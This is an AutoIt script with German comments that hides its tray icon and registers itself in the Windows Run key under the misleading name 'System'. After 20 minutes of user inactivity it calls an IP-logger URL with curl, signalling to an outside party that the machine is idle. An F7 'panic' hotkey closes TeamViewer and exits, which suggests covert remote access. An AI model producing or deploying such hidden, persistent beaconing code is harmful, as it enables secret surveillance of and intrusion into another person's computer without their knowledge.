#Include <file.au3>
#include <Timers.au3>
#NoTrayIcon

HotKeySet("{F7}", "Panikbutton")

RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "System", "REG_SZ", @ScriptFullPath) ;Autostart Funktion

While 1
if _Timer_GetIdleTime() =  20 * 60 * 1000 then  ;Zeit einstellen bis zur Anfrage
Run(@ComSpec & " /c " & "curl " & "https://maper.info/....", @SystemDir, @SW_SHOW) ;Http Anfrage zum IP Logger
Sleep(8000)
EndIf
WEnd

Func Panikbutton()
ProcessClose("TeamViewer.exe")
ProcessClose("TeamViewer_Service.exe")
Exit
EndFunc